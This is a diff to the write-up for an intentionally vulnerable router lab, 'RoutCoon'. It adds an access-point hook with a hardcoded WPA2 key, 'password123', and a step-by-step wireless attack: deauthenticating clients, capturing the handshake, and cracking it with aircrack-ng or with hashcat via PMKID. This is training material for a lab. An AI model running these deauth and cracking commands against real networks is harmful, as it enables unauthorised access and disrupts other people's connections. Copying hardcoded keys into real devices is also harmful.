@@ -23,13 +23,14 @@ affected_components:
   - "labs/routcoon/files/etc/init.d/ftpd"
   - "labs/routcoon/files/etc/snmp/snmpd.conf"
   - "labs/routcoon/files/etc/config/upnpd"
-  - "labs/routcoon/files/etc/dnsmasq.conf"
+  - "labs/routcoon/files/etc/dnsmasq.conf.reference"
   - "labs/routcoon/files/etc/opkg.conf"
   - "labs/routcoon/files/opt/oem-updates/scripts/auto-updater.sh"
   - "labs/routcoon/files/usr/lib/lua/luci/controller/support/remote.lua"
+  - "labs/routcoon/files/usr/lib/vulnzoo-hooks/profile-init.d/88-routcoon-wifi-ap.sh"
 findings:
   - "IoT1: DONE"
-  - "IoT2: IN PROGRESS (Samba wired, live-pending; DHCP/DNS attacks unproven)"
+  - "IoT2: IN PROGRESS (wireless AP DONE, PSK cracked live, DHCP boots from UCI after parking the monolithic dnsmasq.conf; Samba + DHCP/DNS reference-only still live-pending)"
   - "IoT3: DONE"
   - "IoT4: DONE"
   - "IoT5: IN PROGRESS"
@@ -619,7 +620,7 @@ This is related to the risk [[#IoT:I8 - Lack of device management]].
 - `dhcp-authoritative` without validation.
 - `read-ethers` enabled without protection.
 These configurations are insecure and enable possible impacts such as DNS rebinding and DNS Cache Poisoning.
-> **IN PROGRESS.** Scoped against the real config below: lease tampering works locally, starvation is blocked by `dhcp-ignore=tag:!known`, and DNS rebinding (not the off-path poisoning) is the real weakness. Live reproduction pending a flashed image.
+> **IN PROGRESS.** The monolithic `/etc/dnsmasq.conf` is now shipped as `dnsmasq.conf.reference` and is not auto-loaded, because as `/etc/dnsmasq.conf` it clashed with the UCI config on `cache-size` and crash-looped dnsmasq (no DHCP at all, see IoT:I2 wireless AP below). With it parked, dnsmasq runs from the UCI config: the world-writable `/tmp` leasefile (lease tampering) stays active via `dhcp.@dnsmasq[0].leasefile`, but the rest of the settings below (cache-size, dhcp-lease-max, dhcp-script, `dhcp-ignore`, disabled `stop-dns-rebind`) describe the reference file and are not active until folded into UCI. Read the code blocks below as the reference file's content, not the live config. Live reproduction of the UCI-active items pending.
 
 The DHCP and DNS service configuration is insecure, but not every attack below works against the shipped `dnsmasq.conf`. Each is scoped to what the real config actually allows (no live reproduction was run this session):
 
@@ -661,6 +662,80 @@ def dns_poison():
 
 dns_poison()
 ```
+### 2.8 Wireless AP (weak WPA2-PSK)
+
+> **DONE.** Attack chain verified end to end on a live Pi (Cypress CYW43455): the AP broadcasts `RoutCoon` on 2.4GHz channel 6 (WPA2), a laptop and a phone associate and get `192.168.3.x` leases, reach LuCI at `192.168.3.1`, and the WPA2 handshake was captured and cracked offline to `password123`. Two defects found and fixed during verification, both now in source: the hook forced `band 5g`/`VHT80` that the brcmfmac driver rejects in AP mode (`AP-DISABLED`), corrected to `band 2g`/`NOHT`, and dnsmasq crash-looped on a `cache-size` clash between the overlay's monolithic `/etc/dnsmasq.conf` and the UCI config, resolved by shipping that file as `dnsmasq.conf.reference` so dnsmasq boots from UCI. A cold-boot reflash reproduces the whole chain.
+
+RoutCoon now behaves like a real router: it broadcasts its own Wi-Fi network from the Pi onboard radio instead of only living on the wired `eth0` LAN. The access point runs in `mode ap` with WPA2-PSK and is its own network, `192.168.3.0/24`, with the router as the gateway at `192.168.3.1` and its own DHCP pool. Because every service already binds `0.0.0.0`, a client that associates to the Wi-Fi reaches LuCI :80, Dropbear :22, FTP :21, SNMP :161, telnet :5515 and UPnP :5000 at `192.168.3.1`, so the whole service surface documented above becomes reachable over the air with no wired foothold.
+
+The weakness is the pre-shared key. It is hardcoded into the lab image, identical on every deployment, never rotated, and present in common wordlists, so it is recovered offline from a single 4-way-handshake capture (CWE-798 / CWE-521). This is the wireless face of [[#IoT:I1 - Weak Guessable, or Hardcoded Passwords]].
+
+The AP is provisioned by `88-routcoon-wifi-ap.sh`, where the intentional weakness sits as tunable knobs at the top of the file:
+```sh
+AP_SSID="RoutCoon"
+AP_PSK="password123"          # hardcoded, in rockyou (CWE-798 / CWE-521)
+...
+uci set wireless.@wifi-iface[-1].mode='ap'
+uci set wireless.@wifi-iface[-1].encryption='psk2'
+uci set wireless.@wifi-iface[-1].key="$AP_PSK"
+```
+
+Over-the-air attack (run from a second station with a monitor-capable adapter):
+```sh
+# 1. find the network and note its BSSID and channel
+nmcli dev wifi list | grep RoutCoon        # or with iwd: iwctl station <dev> get-networks
+
+# 2. kill managed-mode services and drop the adapter into monitor mode
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0                 # creates wlan0mon
+
+# 3. locate the AP on the air, note its BSSID and channel
+sudo airodump-ng wlan0mon                  # find RoutCoon, then Ctrl-C
+
+# 4. lock to it and capture the WPA2 4-way handshake, deauth a client to force it
+sudo airodump-ng -c 6 --bssid <AP_BSSID> -w routcoon wlan0mon
+sudo aireplay-ng --deauth 5 -a <AP_BSSID> wlan0mon
+
+# 5. crack the PSK offline
+aircrack-ng -w /usr/share/wordlists/rockyou.txt routcoon-01.cap   # -> KEY FOUND! [ password123 ]
+
+# 6. restore managed wifi, associate, and reach the services
+sudo airmon-ng stop wlan0mon
+nmcli dev wifi connect RoutCoon password 'password123'
+curl -s http://192.168.3.1/                # LuCI, then chain any 2.x finding above
+```
+
+Listing WiFi networks with NetworkManager CLI:
+
+![[iot2-nmcli-list-wifi-networks.png]]
+
+You can also list available WiFi networks and their properties with `airodump-ng`:
+
+![[iot2-list-wifi-networks-airodump.png]]
+
+Capture the WPA2 4-way handshake forcing deauthentication attack:
+
+![[iot2-deauth-mobile.png]]
+
+Use `aircrack-ng` to crack WiFi network's password using the network capture:
+
+![[iot2-wifi-password-cracked.png]]
+
+Clientless alternative (PMKID). If no client is connected to force a handshake, capture the PMKID that the AP puts in its first RSN frame and crack it with hashcat mode 22000. No associated victim is required:
+```sh
+# capture PMKID in monitor mode (hcxdumptool flags vary by version, check yours)
+sudo hcxdumptool -i wlan0mon -w routcoon.pcapng
+
+# convert to the hashcat 22000 (WPA-PBKDF2-PMKID+EAPOL) format
+hcxpcapngtool -o routcoon.22000 routcoon.pcapng
+
+# crack the same weak PSK
+hashcat -m 22000 routcoon.22000 /usr/share/wordlists/rockyou.txt
+```
+The recovered key is the same weak PSK (`password123`), so this is a second path to the same over-the-air foothold, useful when the AP has no clients to deauth.
+
+Hardware note: the onboard radio exists on Pi 3B/3B+ (the `brcmfmac` nvram for 43430/43455 is in `.config`). On a real Pi 2 (the `bcm2709` build profile) a USB Wi-Fi adapter is required. If no radio is present the hook logs a `no wifi-device` warning to `/root/vulnzoo.log` and leaves the other services untouched. The hook forces 2.4GHz channel 6 with `htmode NOHT` (802.11g), because the brcmfmac FullMAC driver rejects the HT capabilities hostapd auto-generates in AP mode and would otherwise leave the interface disabled. The runtime interface is `phy0-ap0`.
+
 # IoT:I3 - Insecure Ecosystem Interfaces
 
 > **DONE.** Low-severity finding. Per OWASP the fuller scope of insecure ecosystem interfaces belongs to the mobile/backend interface rather than the device, so this device-side item is intentionally minimal.
